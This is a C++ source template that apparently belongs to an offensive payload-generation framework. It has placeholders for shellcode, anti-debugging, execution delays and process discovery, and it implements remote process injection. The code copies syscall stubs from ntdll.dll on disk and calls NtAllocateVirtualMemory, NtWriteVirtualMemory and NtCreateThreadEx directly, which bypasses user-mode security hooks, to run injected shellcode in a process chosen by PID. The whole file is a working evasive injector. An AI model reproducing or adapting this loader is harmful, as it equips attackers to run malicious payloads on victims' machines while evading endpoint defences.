#include <iostream>
#include <fstream>
#include <iostream>
#include "windows.h"
#include "winternl.h"
//####USING####

#define UNICODE 1
#pragma once
#pragma comment(lib, "ntdll")

//####DEFINE####

int const SYSCALL_STUB_SIZE = 23;


//####CODE####


PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, LPVOID syscallStub)
{
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	LPVOID fileData = NULL;

	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	bool res = ReadFile(file, fileData, fileSize, &bytesRead, NULL);
	if (!res) {
		exit(1);
	}
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE;

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
		}
	}

	return stubFound;
}

using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, unsigned char* Buffer, ULONG RegionSize, PULONG numBytesWritten);

using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

int Inject(int pid) {


	const unsigned char raw[] = ####SHELLCODE####;
	int length = sizeof(raw);

	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
	memcpy(encoded, raw, length);

	//####CALL####

	unsigned char* decoded = encoded;

	LPVOID allocation_start;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPCSTR cmd;
	myNtAllocateVirtualMemory NtAllocateVirtualMemory;
	myNtWriteVirtualMemory NtWriteVirtualMemory;
	myNtCreateThreadEx NtCreateThreadEx;
	HANDLE hThread;
	HANDLE procHandle;
	SIZE_T RegionSize = (SIZE_T)length;


		/* The below code defines the syscall functions and retrieves syscall stubs */

		char syscallStub_NtAlloc[SYSCALL_STUB_SIZE] = {};
		char syscallStub_NtWrite[SYSCALL_STUB_SIZE] = {};
		char syscallStub_NtCreate[SYSCALL_STUB_SIZE] = {};
		DWORD oldProtection = 0;

		// define NtAllocateVirtualMemory
		NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)(LPVOID)syscallStub_NtAlloc;
		VirtualProtect(syscallStub_NtAlloc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// define NtWriteVirtualMemory
		NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub_NtWrite;
		VirtualProtect(syscallStub_NtWrite, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// define NtCreateThreadEx
		NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub_NtCreate;
		VirtualProtect(syscallStub_NtCreate, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// get syscall stubs
		GetSyscallStub("NtAllocateVirtualMemory", syscallStub_NtAlloc);
		GetSyscallStub("NtWriteVirtualMemory", syscallStub_NtWrite);
		GetSyscallStub("NtCreateThreadEx", syscallStub_NtCreate);

		allocation_start = nullptr;

		/* this code will inject into a remote process that we didnt start given PID using direct syscalls */

		printf("[*] Injecting into remote process using direct syscalls\n\n");

		procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		NtWriteVirtualMemory(procHandle, allocation_start, decoded, length, 0);
		NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

		printf("[+] Injected into remote process\n\n");

		return 0;
}

int main(int argc, char* argv[]) {
	using namespace std::literals;

    //####DELAY####

	//####ANTIDEBUG####

	//IGNORE the ####UNHOOK####, as this template dynamically loads functions from the ntdll.dll file itself

    //####ARGS####
    int pid = 0;
	if (argc < 2) {
		printf("[-] Missing PID... Finding...\n");
		//####FIND_PROCESS####
	}else{
    	pid = atoi(argv[1]);
	}

    if (pid == 0){
        printf("[-] Process not found\n");
        exit(1);
    }

	Inject(pid);

}